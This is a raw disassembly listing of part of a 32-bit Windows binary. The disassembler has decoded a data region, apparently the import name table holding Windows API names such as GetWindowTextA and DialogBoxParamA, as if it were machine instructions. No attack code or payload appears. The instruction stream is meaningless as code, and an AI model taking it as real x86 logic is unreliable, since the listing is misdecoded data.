  412aa4:	dec    ecx
  412aa5:	outs   dx,BYTE PTR ds:[esi]
  412aa6:	jo     0x412b1d
  412aa8:	je     0x412aee
  412aaa:	gs jae 0x412b18
  412aad:	je     0x412b1e
  412aaf:	jo     0x412ab1
  412ab1:	add    BYTE PTR [ebp+0x73795302],al
  412ab7:	je     0x412b1e
  412ab9:	ins    DWORD PTR es:[edi],dx
  412aba:	push   eax
  412abb:	popa   
  412abc:	jb     0x412b1f
  412abe:	ins    DWORD PTR es:[edi],dx
  412abf:	gs je  0x412b27
  412ac2:	jb     0x412b37
  412ac4:	dec    ecx
  412ac5:	outs   dx,BYTE PTR ds:[esi]
  412ac6:	outs   dx,WORD PTR ds:[esi]
  412ac8:	inc    ecx
  412ac9:	add    BYTE PTR [esi+0x2],cl
  412acc:	push   ebx
  412acd:	gs je  0x412b1d
  412ad0:	outs   dx,BYTE PTR gs:[esi]
  412ad2:	jne    0x412b1d
  412ad4:	je     0x412b3b
  412ad6:	ins    DWORD PTR es:[edi],dx
  412ad7:	dec    ecx
  412ad8:	outs   dx,BYTE PTR ds:[esi]
  412ad9:	outs   dx,WORD PTR ds:[esi]
  412adb:	push   edi
  412adc:	add    BYTE PTR [eax],al
  412ade:	adc    eax,0x6c655202
  412ae3:	gs popa 
  412ae5:	jae    0x412b4c
  412ae7:	inc    esp
  412ae8:	inc    ebx
  412ae9:	add    BYTE PTR [ecx+0x766e4901],cl
  412aef:	popa   
  412af0:	ins    BYTE PTR es:[edi],dx
  412af1:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x63655265
  412af9:	je     0x412afb
  412afb:	add    BYTE PTR [edx+eax*1+0x74697753],al
  412b02:	arpl   WORD PTR [eax+0x54],bp
  412b05:	outs   dx,DWORD PTR ds:[esi]
  412b06:	push   esp
  412b07:	push   0x69577369
  412b0c:	outs   dx,BYTE PTR ds:[esi]
  412b0d:	outs   dx,DWORD PTR fs:[esi]
  412b0f:	ja     0x412b11
  412b11:	add    BYTE PTR [esi+0x6c694b01],ah
  412b17:	ins    BYTE PTR es:[edi],dx
  412b18:	push   esp
  412b19:	imul   ebp,DWORD PTR [ebp+0x65],0x2bd0072
  412b20:	imul   esp,DWORD PTR [ebp+0x79],0x62
  412b24:	fs pop edi
  412b26:	gs jbe 0x412b8e
  412b29:	outs   dx,BYTE PTR ds:[esi]
  412b2a:	je     0x412b2c
  412b2c:	cmp    eax,0x65684300
  412b31:	arpl   WORD PTR [ebx+0x52],bp
  412b34:	popa   
  412b35:	imul   ebp,DWORD PTR fs:[edi+0x42],0x6f747475
  412b3d:	outs   dx,BYTE PTR ds:[esi]
  412b3e:	add    BYTE PTR [eax],al
  412b40:	sahf   
  412b41:	add    DWORD PTR [ecx+0x73],ecx
  412b44:	push   edx
  412b45:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  412b4a:	jo     0x412bc0
  412b4c:	jns    0x412b4e
  412b4e:	mov    es,WORD PTR [ecx]
  412b50:	dec    ecx
  412b51:	jae    0x412b96
  412b53:	push   0x6c417261
  412b58:	jo     0x412bc2
  412b5a:	popa   
  412b5b:	dec    esi
  412b5c:	jne    0x412bcb
  412b5e:	gs jb  0x412bca
  412b61:	arpl   WORD PTR [edi+0x0],dx
  412b64:	mov    ch,0x0
  412b66:	inc    esp
  412b67:	jb     0x412bca
  412b69:	ja     0x412bb8
  412b6b:	outs   dx,BYTE PTR gs:[esi]
  412b6d:	jne    0x412bb1
  412b6f:	popa   
  412b70:	jb     0x412b72
  412b72:	mov    BYTE PTR [edx],al
  412b74:	push   esp
  412b75:	popa   
  412b76:	bound  esp,QWORD PTR [edx+0x65]
  412b79:	fs push esp
  412b7b:	gs js  0x412bf2
  412b7e:	dec    edi
  412b7f:	jne    0x412bf5
  412b81:	push   edi
  412b82:	add    BYTE PTR [eax],al
  412b84:	or     eax,DWORD PTR [ecx]
  412b86:	inc    edi
  412b87:	gs je  0x412bce
  412b8a:	inc    ebx
  412b8b:	inc    ebp
  412b8c:	js     0x412b8e
  412b8e:	jno    0x412b92
  412b90:	push   ebx
  412b91:	gs je  0x412beb
  412b94:	imul   ebp,DWORD PTR [esi+0x64],0x6752776f
  412b9b:	outs   dx,BYTE PTR ds:[esi]
  412b9c:	add    BYTE PTR [eax],al
  412b9e:	xchg   ebx,eax
  412b9f:	add    BYTE PTR [ebp+eiz*2+0x73],al
  412ba3:	je     0x412c17
  412ba5:	outs   dx,DWORD PTR ds:[esi]
  412ba6:	jns    0x412be9
  412ba8:	arpl   WORD PTR [ebx+0x65],sp
  412bab:	ins    BYTE PTR es:[edi],dx
  412bac:	gs jb  0x412c10
  412baf:	je     0x412c20
  412bb1:	jb     0x412c07
  412bb3:	popa   
  412bb4:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  412bb8:	push   edi
  412bb9:	add    dl,BYTE PTR [ebx+0x65]
  412bbc:	je     0x412c0e
  412bbe:	jb     0x412c2f
  412bc0:	jo     0x412c19
  412bc2:	add    BYTE PTR [eax],al
  412bc4:	sti    
  412bc5:	add    DWORD PTR [eax+0x74],edx
  412bc8:	dec    ecx
  412bc9:	outs   dx,BYTE PTR ds:[esi]
  412bca:	push   edx
  412bcb:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  412bd0:	push   0x74655302
  412bd5:	push   ebp
  412bd6:	jae    0x412c3d
  412bd8:	jb     0x412c29
  412bda:	bound  ebp,QWORD PTR [edx+0x65]
  412bdd:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  412be1:	outs   dx,WORD PTR ds:[esi]
  412be3:	jb     0x412c52
  412be5:	popa   
  412be6:	je     0x412c51
  412be8:	outs   dx,DWORD PTR ds:[esi]
  412be9:	outs   dx,BYTE PTR ds:[esi]
  412bea:	push   edi
  412beb:	add    dh,ch
  412bed:	add    DWORD PTR [eax+0x65],edx
  412bf0:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  412bf5:	jae    0x412c58
  412bf7:	addr16 gs inc ecx
  412bfa:	add    BYTE PTR [eax],al
  412bfc:	xor    eax,0x61684300
  412c01:	jb     0x412c57
  412c03:	outs   dx,DWORD PTR ds:[esi]
  412c04:	dec    edi
  412c05:	gs ins DWORD PTR es:[edi],dx
  412c07:	push   edi
  412c08:	add    BYTE PTR [eax],al
  412c0a:	add    BYTE PTR [ecx],0x49
  412c0d:	outs   dx,BYTE PTR ds:[esi]
  412c0e:	data16 ins BYTE PTR es:[edi],dx
  412c10:	popa   
  412c11:	je     0x412c78
  412c13:	push   edx
  412c14:	arpl   WORD PTR gs:[eax+eax*1-0x4d],si
  412c19:	add    BYTE PTR [edx+esi*2+0x61],al
  412c1d:	ja     0x412c68
  412c1f:	arpl   WORD PTR [edi+0x6e],bp
  412c22:	add    BYTE PTR [eax],al
  412c24:	mov    dl,0x0
  412c26:	inc    esp
  412c27:	jb     0x412c8a
  412c29:	ja     0x412c71
  412c2b:	jb     0x412c8e
  412c2d:	ins    DWORD PTR es:[edi],dx
  412c2e:	gs inc ebx
  412c30:	outs   dx,DWORD PTR ds:[esi]
  412c31:	outs   dx,BYTE PTR ds:[esi]
  412c32:	je     0x412ca6
  412c34:	outs   dx,DWORD PTR ds:[esi]
  412c35:	ins    BYTE PTR es:[edi],dx
  412c36:	add    BYTE PTR [eax],al
  412c38:	inc    edx
  412c39:	add    DWORD PTR [edi+0x65],eax
  412c3c:	je     0x412c8c
  412c3e:	gs js  0x412cb5
  412c41:	inc    esp
  412c42:	ins    BYTE PTR es:[edi],dx
  412c43:	addr16 inc edi
  412c45:	jb     0x412cb6
  412c47:	jne    0x412cb9
  412c49:	dec    ecx
  412c4a:	je     0x412cb1
  412c4c:	ins    DWORD PTR es:[edi],dx
  412c4d:	add    BYTE PTR ds:0x6e655302,ah
  412c53:	fs dec ecx
  412c55:	outs   dx,BYTE PTR ds:[esi]
  412c56:	jo     0x412ccd
  412c58:	je     0x412c5a
  412c5a:	mov    DWORD PTR [eax],eax
  412c5c:	inc    esp
  412c5d:	gs inc si
  412c60:	jb     0x412cc3
  412c62:	ins    DWORD PTR es:[edi],dx
  412c63:	gs push eax
  412c65:	jb     0x412cd6
  412c67:	arpl   WORD PTR [ecx+0x0],ax
  412c6a:	mov    es,WORD PTR [eax]
  412c6c:	inc    esp
  412c6d:	gs push di
  412c70:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  412c77:	outs   dx,DWORD PTR ds:[esi]
  412c78:	arpl   WORD PTR [ecx+0x0],ax
  412c7b:	add    BYTE PTR [eax+eax*1+0x6c616944],bl
  412c82:	outs   dx,DWORD PTR ds:[esi]
  412c83:	addr16 inc edx
  412c85:	outs   dx,DWORD PTR ds:[esi]
  412c86:	js     0x412cd8
  412c88:	popa   
  412c89:	jb     0x412cec
  412c8b:	ins    DWORD PTR es:[edi],dx
  412c8c:	inc    ecx
  412c8d:	add    BYTE PTR [edx],al
  412c8f:	add    dl,BYTE PTR [edx+0x65]
  412c92:	imul   esi,DWORD PTR [bp+di+0x74],0x6c437265
  412c9a:	popa   
  412c9b:	jae    0x412d10
  412c9d:	inc    ecx
  412c9e:	add    BYTE PTR [eax],al
  412ca0:	dec    edx
  412ca1:	add    BYTE PTR [ebx+0x6f],al
  412ca4:	jo     0x412d1f
  412ca6:	inc    ecx
  412ca7:	arpl   WORD PTR [ebx+0x65],sp
  412caa:	ins    BYTE PTR es:[edi],dx
  412cab:	gs jb  0x412d0f
  412cae:	je     0x412d1f
  412cb0:	jb     0x412d06
  412cb2:	popa   
  412cb3:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  412cb7:	add    BYTE PTR [ebx+0x1],bl
  412cba:	inc    edi
  412cbb:	gs je  0x412d11
  412cbe:	jns    0x412d33
  412cc0:	je     0x412d27
  412cc2:	ins    DWORD PTR es:[edi],dx
  412cc3:	dec    ebp
  412cc4:	outs   dx,BYTE PTR gs:[esi]
  412cc6:	jne    0x412cc8
  412cc8:	mov    eax,0x61724400
  412ccd:	ja     0x412d22
  412ccf:	je     0x412d32
  412cd1:	je     0x412d38
  412cd3:	push   edi
  412cd4:	add    BYTE PTR [eax],al
  412cd6:	loope  0x412cd8
  412cd8:	inc    esi
  412cd9:	imul   ebp,DWORD PTR [esi+0x64],0x646e6957
  412ce0:	outs   dx,DWORD PTR ds:[esi]
  412ce1:	ja     0x412d24
  412ce3:	add    BYTE PTR [edx+0x0],ah
  412ce6:	inc    ebx
  412ce7:	jb     0x412d4e
  412ce9:	popa   
  412cea:	je     0x412d51
  412cec:	push   edi
  412ced:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  412cf4:	inc    ecx
  412cf5:	add    cl,al
  412cf7:	add    BYTE PTR [ebp+0x6e],al
  412cfa:	popa   
  412cfb:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  412cff:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412d06:	cmp    DWORD PTR [eax],eax
  412d08:	inc    ebx
  412d09:	push   0x70557261
  412d0e:	jo     0x412d75
  412d10:	jb     0x412d69
  412d12:	add    BYTE PTR [eax],al
  412d14:	or     al,BYTE PTR [edx]
  412d16:	push   edx
  412d17:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6f487265
  412d20:	je     0x412d6d
  412d22:	gs jns 0x412d25
  412d25:	add    BYTE PTR [ebx],al
  412d27:	add    BYTE PTR [ecx+0x64],al
  412d2a:	push   0x75
  412d2c:	jae    0x412da2
  412d2e:	push   edi
  412d2f:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  412d36:	arpl   WORD PTR [ebp+eax*2+0x78],si
  412d3a:	add    BYTE PTR [eax],al
  412d3c:	aad    0x1
  412d3e:	dec    ebp
  412d3f:	gs jae 0x412db5
  412d42:	popa   
  412d43:	addr16 gs inc edx
  412d46:	outs   dx,DWORD PTR ds:[esi]
  412d47:	js     0x412da0
  412d49:	add    bh,cl
  412d4b:	add    DWORD PTR [ebp+0x65],ecx
  412d4e:	jae    0x412dc3
  412d50:	popa   
  412d51:	addr16 gs inc edx
  412d54:	outs   dx,DWORD PTR ds:[esi]
  412d55:	js     0x412d9c
  412d57:	js     0x412d9a
  412d59:	add    BYTE PTR [edx+0x1],ah
  412d5c:	inc    edi
  412d5d:	gs je  0x412db4
  412d60:	outs   dx,DWORD PTR ds:[esi]
  412d61:	jo     0x412dba
  412d63:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412d6a:	dec    eax
  412d6b:	add    dl,BYTE PTR [ebx+0x65]
  412d6e:	je     0x412dbd
  412d70:	outs   dx,BYTE PTR gs:[esi]
  412d72:	jne    0x412d74
  412d74:	loop   0x412d76
  412d76:	inc    esi
  412d77:	imul   ebp,DWORD PTR [esi+0x64],0x646e6957
  412d7e:	outs   dx,DWORD PTR ds:[esi]
  412d7f:	ja     0x412dc6
  412d81:	js     0x412dc4
  412d83:	add    BYTE PTR [esi+0x616f4c01],dh
  412d89:	fs dec ebp
  412d8b:	outs   dx,BYTE PTR gs:[esi]
  412d8d:	jne    0x412dd0
  412d8f:	add    dh,cl
  412d91:	add    DWORD PTR [ebp+0x65],ecx
  412d94:	jae    0x412e09
  412d96:	popa   
  412d97:	addr16 gs inc edx
  412d9a:	outs   dx,DWORD PTR ds:[esi]
  412d9b:	js     0x412dde
  412d9d:	add    ch,bl
  412d9f:	add    BYTE PTR [ebp+0x71],al
  412da2:	jne    0x412e05
  412da4:	ins    BYTE PTR es:[edi],dx
  412da5:	push   edx
  412da6:	arpl   WORD PTR gs:[eax+eax*1-0x72],si
  412dab:	add    dl,BYTE PTR [edi+ebp*2+0x55]
  412daf:	outs   dx,BYTE PTR ds:[esi]
  412db0:	imul   esp,DWORD PTR [ebx+0x6f],0x78456564
  412db7:	add    BYTE PTR [edi+0x1],dh
  412dba:	inc    edi
  412dbb:	gs je  0x412e15
  412dbe:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  412dc5:	js     0x412e3b
  412dc7:	dec    esp
  412dc8:	outs   dx,BYTE PTR gs:[esi]
  412dca:	addr16 je 0x412e35
  412dcd:	push   edi
  412dce:	add    BYTE PTR [eax],al
  412dd0:	mov    al,BYTE PTR [edx]
  412dd2:	push   esp
  412dd3:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x6f646e69
  412ddb:	ja     0x412e50
  412ddd:	add    dh,bh
  412ddf:	add    BYTE PTR [edi+0x65],al
  412de2:	je     0x412e27
  412de4:	ins    BYTE PTR es:[edi],dx
  412de5:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  412dec:	jb     0x412dee
  412dee:	les    eax,FWORD PTR [ecx]
  412df0:	dec    ebp
  412df1:	popa   
  412df2:	jo     0x412e38
  412df4:	imul   esp,DWORD PTR [ecx+0x6c],0x6552676f
  412dfb:	arpl   WORD PTR [eax+eax*1-0x45],si
  412dff:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  412e03:	fs push ebx
  412e05:	je     0x412e79
  412e07:	imul   ebp,DWORD PTR [esi+0x67],0x17e0041
  412e0e:	dec    eax
  412e0f:	imul   ebp,DWORD PTR [ecx+ebp*2+0x74],0x6e654d65
  412e17:	jne    0x412e62
  412e19:	je     0x412e80
  412e1b:	ins    DWORD PTR es:[edi],dx
  412e1c:	add    BYTE PTR [eax],al
  412e1e:	xor    al,BYTE PTR [ecx]
  412e20:	inc    edi
  412e21:	gs je  0x412e71
  412e24:	outs   dx,BYTE PTR gs:[esi]
  412e26:	jne    0x412e71
  412e28:	je     0x412e8f
  412e2a:	ins    DWORD PTR es:[edi],dx
  412e2b:	inc    ebx
  412e2c:	outs   dx,DWORD PTR ds:[esi]
  412e2d:	jne    0x412e9d
  412e2f:	je     0x412e31
  412e31:	add    cl,al
  412e33:	add    DWORD PTR [edi+ebp*2+0x6f],ecx
  412e37:	imul   esi,DWORD PTR [ebp+0x70],0x49
  412e3b:	arpl   WORD PTR [edi+0x6e],bp
  412e3e:	dec    ecx
  412e3f:	fs inc esi
  412e41:	jb     0x412eb2
  412e43:	ins    DWORD PTR es:[edi],dx
  412e44:	inc    esp
  412e45:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  412e4c:	jns    0x412e4e
  412e4e:	mov    BYTE PTR [ecx],al
  412e50:	dec    ecx
  412e51:	outs   dx,BYTE PTR ds:[esi]
  412e52:	je     0x412eb9
  412e54:	jb     0x412ec9
  412e56:	arpl   WORD PTR gs:[edx+edx*2+0x65],si
  412e5b:	arpl   WORD PTR [eax+eax*1+0x13],si
  412e5f:	add    DWORD PTR [edi+0x65],eax
  412e62:	je     0x412ea8
  412e64:	outs   dx,DWORD PTR ds:[esi]
  412e65:	jne    0x412ec9
  412e67:	ins    BYTE PTR es:[edi],dx
  412e68:	gs inc ebx
  412e6a:	ins    BYTE PTR es:[edi],dx
  412e6b:	imul   esp,DWORD PTR [ebx+0x6b],0x656d6954
  412e72:	add    BYTE PTR [eax],al
  412e74:	daa    
  412e75:	add    DWORD PTR [edi+0x65],eax
  412e78:	je     0x412ec5
  412e7a:	gs jns 0x412edf
  412e7d:	outs   dx,DWORD PTR ds:[esi]
  412e7e:	popa   
  412e7f:	jb     0x412ee5
  412e81:	push   esp
  412e82:	jns    0x412ef4
  412e84:	gs add al,dh
  412e87:	add    BYTE PTR [edi+0x65],al
  412e8a:	je     0x412ecd
  412e8c:	jae    0x412f07
  412e8e:	outs   dx,BYTE PTR ds:[esi]
  412e8f:	arpl   WORD PTR [ebx+0x65],cx
  412e92:	jns    0x412ee7
  412e94:	je     0x412ef7
  412e96:	je     0x412efd
  412e98:	add    BYTE PTR [eax],al
  412e9a:	sub    BYTE PTR [eax],al
  412e9c:	inc    ebx
  412e9d:	push   0x6f4c7261
  412ea2:	ja     0x412f09
  412ea4:	jb     0x412ee8
  412ea6:	jne    0x412f0e
  412ea8:	push   di
  412eaa:	add    BYTE PTR [eax],al
  412eac:	popf   
  412ead:	add    BYTE PTR [ecx+ebp*2+0x61],al
  412eb1:	ins    BYTE PTR es:[edi],dx
  412eb2:	outs   dx,DWORD PTR ds:[esi]
  412eb3:	addr16 inc edx
  412eb5:	outs   dx,DWORD PTR ds:[esi]
  412eb6:	js     0x412f08
  412eb8:	popa   
  412eb9:	jb     0x412f1c
  412ebb:	ins    DWORD PTR es:[edi],dx
  412ebc:	push   edi
  412ebd:	add    BYTE PTR [ecx],ch
  412ebf:	add    BYTE PTR [ebx+0x68],al
  412ec2:	popa   
  412ec3:	jb     0x412f11
  412ec5:	outs   dx,DWORD PTR ds:[esi]
  412ec6:	ja     0x412f2d
  412ec8:	jb     0x412f21
  412eca:	add    BYTE PTR [eax],al
  412ecc:	and    al,0x0
  412ece:	inc    ebx
  412ecf:	push   0x65676e61
  412ed4:	dec    ebp
  412ed5:	outs   dx,BYTE PTR gs:[esi]
  412ed7:	jne    0x412f30
  412ed9:	add    BYTE PTR [edi+0x636f4c01],bh
  412edf:	imul   edx,DWORD PTR [edi+0x69],0x6e
  412ee3:	outs   dx,DWORD PTR fs:[esi]
  412ee5:	ja     0x412f3c
  412ee7:	jo     0x412f4d
  412ee9:	popa   
  412eea:	je     0x412f51
  412eec:	add    BYTE PTR [eax],al
  412eee:	mov    al,ds:0x57734901
  412ef3:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412efa:	mov    DWORD PTR [ecx],0x5670614d
  412f00:	imul   esi,DWORD PTR [edx+0x74],0x4b6c6175
  412f07:	gs jns 0x412f4f
  412f0a:	js     0x412f63
  412f0c:	add    BYTE PTR [eax],al
  412f0e:	pop    ecx
  412f0f:	add    dl,BYTE PTR [ebx+0x65]
  412f12:	je     0x412f66
  412f14:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  412f19:	jo     0x412f8f
  412f1b:	jns    0x412f1d
  412f1d:	add    al,bh
  412f1f:	add    BYTE PTR [edi+0x65],al
  412f22:	je     0x412f67
  412f24:	ins    BYTE PTR es:[edi],dx
  412f25:	popa   
  412f26:	jae    0x412f9b
  412f28:	dec    esp
  412f29:	outs   dx,DWORD PTR ds:[esi]
  412f2a:	outs   dx,BYTE PTR ds:[esi]
  412f2b:	addr16 inc ecx
  412f2d:	add    cl,cl
  412f2f:	add    DWORD PTR [ebp+0x61],ecx
  412f32:	jo     0x412f8b
  412f34:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  412f3b:	imul   ebp,DWORD PTR [esi+0x74],0x2930073
  412f42:	push   esp
  412f43:	jb     0x412fa6
  412f45:	outs   dx,BYTE PTR ds:[esi]
  412f46:	jae    0x412fb4
  412f48:	popa   
  412f49:	je     0x412fb0
  412f4b:	inc    ecx
  412f4c:	arpl   WORD PTR [ebx+0x65],sp
  412f4f:	ins    BYTE PTR es:[edi],dx
  412f50:	gs jb  0x412fb4
  412f53:	je     0x412fc4
  412f55:	jb     0x412f98
  412f57:	add    BYTE PTR [eax+eax*1],bh
  412f5a:	inc    ebx
  412f5b:	push   0x4d6b6365
  412f60:	outs   dx,BYTE PTR gs:[esi]
  412f62:	jne    0x412fb6
  412f64:	popa   
  412f65:	imul   ebp,DWORD PTR fs:[edi+0x49],0x6d6574
  412f6d:	add    BYTE PTR [edx+0x2],bl
  412f70:	push   ebx
  412f71:	gs je  0x412fc7
  412f74:	arpl   WORD PTR [edx+0x6f],si
  412f77:	ins    BYTE PTR es:[edi],dx
  412f78:	ins    BYTE PTR es:[edi],dx
  412f79:	dec    ecx
  412f7a:	outs   dx,BYTE PTR ds:[esi]
  412f7b:	outs   dx,WORD PTR ds:[esi]
  412f7d:	add    BYTE PTR ds:0x6c6c4100,al
  412f83:	outs   dx,DWORD PTR ds:[esi]
  412f84:	ja     0x412fd9
  412f86:	gs je  0x412fcf
  412f89:	outs   dx,DWORD PTR ds:[esi]
  412f8a:	jb     0x412ff1
  412f8c:	addr16 jb 0x412ffe
  412f8f:	jne    0x412fff
  412f91:	fs push edi
  412f93:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412f9a:	lahf   
  412f9b:	add    BYTE PTR [ecx+ebp*2+0x73],al
  412f9f:	jo     0x413002
  412fa1:	je     0x413006
  412fa3:	push   0x7373654d
  412fa8:	popa   
  412fa9:	addr16 gs inc ecx
  412fac:	add    BYTE PTR [eax],al
  412fae:	sub    eax,0x61684300
  412fb3:	jb     0x413003
  412fb5:	gs js  0x41302c
  412fb8:	push   edi
  412fb9:	add    bh,ah
  412fbb:	add    BYTE PTR [esi+0x72],al
  412fbe:	popa   
  412fbf:	ins    DWORD PTR es:[edi],dx
  412fc0:	gs push edx
  412fc2:	arpl   WORD PTR gs:[eax+eax*1-0x1c],si
  412fc7:	add    DWORD PTR [edi+0x66],ecx
  412fca:	data16 jae 0x413032
  412fcd:	je     0x413021
  412fcf:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  412fd4:	mov    al,BYTE PTR [ecx]
  412fd6:	dec    ecx
  412fd7:	outs   dx,BYTE PTR ds:[esi]
  412fd8:	jbe    0x41303b
  412fda:	ins    BYTE PTR es:[edi],dx
  412fdb:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x6e675265
  412fe3:	add    BYTE PTR [edx+0x2],al
  412fe6:	push   ebx
  412fe7:	gs je  0x413030
  412fea:	outs   dx,DWORD PTR ds:[esi]
  412feb:	jb     0x413052
  412fed:	addr16 jb 0x41305f
  412ff0:	jne    0x413060
  412ff2:	fs push edi
  412ff4:	imul   ebp,DWORD PTR [esi+0x64],0x2f00776f
  412ffb:	add    dl,BYTE PTR [ebx+0x65]
  412ffe:	je     0x413041
  413000:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  413004:	gs push edi
  413006:	imul   ebp,DWORD PTR [esi+0x64],0x9400776f
  41300d:	add    DWORD PTR [ecx+0x73],ecx
  413010:	inc    ebx
  413011:	push   0x646c69
  413016:	fwait
  413017:	add    dl,BYTE PTR [ebp+0x6e]
  41301a:	ins    BYTE PTR es:[edi],dx
  41301b:	outs   dx,DWORD PTR ds:[esi]
  41301c:	popa   
  41301d:	fs dec ebx
  41301f:	gs jns 0x413084
  413022:	outs   dx,DWORD PTR ds:[esi]
  413023:	popa   
  413024:	jb     0x41308a
  413026:	dec    esp
  413027:	popa   
  413028:	jns    0x413099
  41302a:	jne    0x4130a0
  41302c:	add    BYTE PTR [eax],al
  41302e:	pushf  
  41302f:	add    DWORD PTR [ecx+0x73],ecx
  413032:	dec    ecx
  413033:	arpl   WORD PTR [edi+0x6e],bp
  413036:	imul   esp,DWORD PTR [ebx+0x0],0x47013800
  41303d:	gs je  0x41308d
  413040:	outs   dx,BYTE PTR gs:[esi]
  413042:	jne    0x413097
  413044:	je     0x4130b8
  413046:	imul   ebp,DWORD PTR [esi+0x67],0xb9000041
  41304d:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  413051:	fs dec ebp
  413053:	outs   dx,BYTE PTR gs:[esi]
  413055:	jne    0x4130ae
  413057:	add    BYTE PTR [ebx],dl
  413059:	add    dl,BYTE PTR [edx+0x65]
  41305c:	imul   esi,DWORD PTR [bp+di+0x74],0x69577265
  413064:	outs   dx,BYTE PTR ds:[esi]
  413065:	outs   dx,DWORD PTR fs:[esi]
  413067:	ja     0x4130b6
  413069:	gs jae 0x4130df
  41306c:	popa   
  41306d:	addr16 gs push edi
  413070:	add    BYTE PTR [eax],al
  413072:	cmp    BYTE PTR [edx],al
  413074:	push   ebx
  413075:	gs je  0x4130bb
  413078:	jne    0x4130ec
  41307a:	jae    0x4130eb
  41307c:	jb     0x41307e
  41307e:	add    DWORD PTR ds:[edi+0x65],eax
  413082:	je     0x4130d1
  413084:	gs jae 0x4130fa
  413087:	popa   
  413088:	addr16 gs push edi
  41308b:	add    BYTE PTR ds:0x74654701,dl
  413091:	inc    esi
  413092:	outs   dx,DWORD PTR ds:[esi]
  413093:	jb     0x4130fa
  413095:	addr16 jb 0x413107
  413098:	jne    0x413108
  41309a:	fs push edi
  41309c:	imul   ebp,DWORD PTR [esi+0x64],0x5900776f
  4130a3:	add    BYTE PTR [ebx+0x72],al
  4130a6:	gs popa 
  4130a8:	je     0x41310f
  4130aa:	inc    esp
  4130ab:	imul   esp,DWORD PTR [ecx+0x6c],0x6150676f
  4130b2:	jb     0x413115
  4130b4:	ins    DWORD PTR es:[edi],dx
  4130b5:	push   edi
  4130b6:	add    BYTE PTR [eax],al
  4130b8:	stc    
  4130b9:	add    BYTE PTR [edi+0x65],al
  4130bc:	je     0x413101
  4130be:	ins    BYTE PTR es:[edi],dx
  4130bf:	popa   
  4130c0:	jae    0x413135
  4130c2:	dec    esp
  4130c3:	outs   dx,DWORD PTR ds:[esi]
  4130c4:	outs   dx,BYTE PTR ds:[esi]
  4130c5:	addr16 push edi
  4130c7:	add    BYTE PTR [ebp+0x53],dl
  4130ca:	inc    ebp
  4130cb:	push   edx
  4130cc:	xor    esi,DWORD PTR [edx]
  4130ce:	cs fs ins BYTE PTR es:[edi],dx
  4130d1:	ins    BYTE PTR es:[edi],dx
  4130d2:	add    BYTE PTR [eax],al
  4130d4:	mov    ah,0x3
  4130d6:	push   edx
  4130d7:	gs ins DWORD PTR es:[edi],dx
  4130d9:	outs   dx,DWORD PTR ds:[esi]
  4130da:	jbe    0x413141
  4130dc:	inc    esp
  4130dd:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4130e4:	jns    0x41313d
  4130e6:	add    BYTE PTR [eax],al
  4130e8:	add    al,0x3
  4130ea:	dec    esp
  4130eb:	gs popa 
  4130ed:	jbe    0x413154
  4130ef:	inc    ebx
  4130f0:	jb     0x41315b
  4130f2:	je     0x41315d
  4130f4:	arpl   WORD PTR [ecx+0x6c],sp
  4130f7:	push   ebx
  4130f8:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4130fd:	outs   dx,BYTE PTR ds:[esi]
  4130fe:	add    BYTE PTR [eax],al
  413100:	pop    ss
  413101:	add    al,0x53
  413103:	gs je  0x41314c
  413106:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
  41310e:	bound  esi,QWORD PTR [ebp+0x74]
  413111:	gs jae 0x41316b
  413114:	add    BYTE PTR [eax],al
  413116:	xchg   BYTE PTR [esi+edx*2],al
  413119:	imul   esi,DWORD PTR [edx+0x74],0x516c6175
  413120:	jne    0x413187
  413122:	jb     0x41319d
  413124:	add    BYTE PTR [eax],al
  413126:	mov    ds:0x61654802,eax
  41312b:	jo     0x413170
  41312d:	jb     0x413194
  41312f:	popa   
  413130:	je     0x413197
  413132:	add    BYTE PTR [eax],al
  413134:	or     BYTE PTR [ebx+edx*2],al
  413137:	gs je  0x41317d
  41313a:	jne    0x4131ae
  41313c:	jb     0x4131a3
  41313e:	outs   dx,BYTE PTR ds:[esi]
  41313f:	je     0x413185
  413141:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  413148:	jns    0x41318b
  41314a:	add    BYTE PTR [eax],al
  41314c:	cmp    BYTE PTR [ebx],al
  41314e:	dec    edi
  41314f:	jo     0x4131b6
  413151:	outs   dx,BYTE PTR ds:[esi]
  413152:	inc    ebp
  413153:	jbe    0x4131ba
  413155:	outs   dx,BYTE PTR ds:[esi]
  413156:	je     0x413199
  413158:	add    BYTE PTR [eax],al
  41315a:	dec    ebp
  41315b:	add    eax,0x7274736c
  413160:	ins    BYTE PTR es:[edi],dx
  413161:	outs   dx,BYTE PTR gs:[esi]
  413163:	inc    ecx
  413164:	add    BYTE PTR [eax],al
  413166:	add    al,BYTE PTR [bx+0x65]
  41316a:	je     0x4131c0
  41316c:	push   0x64616572
  413171:	dec    esp
  413172:	outs   dx,DWORD PTR ds:[esi]
  413173:	arpl   WORD PTR [ecx+0x6c],sp
  413176:	add    BYTE PTR gs:[ebx+0x4],ch
  41317a:	push   ebp
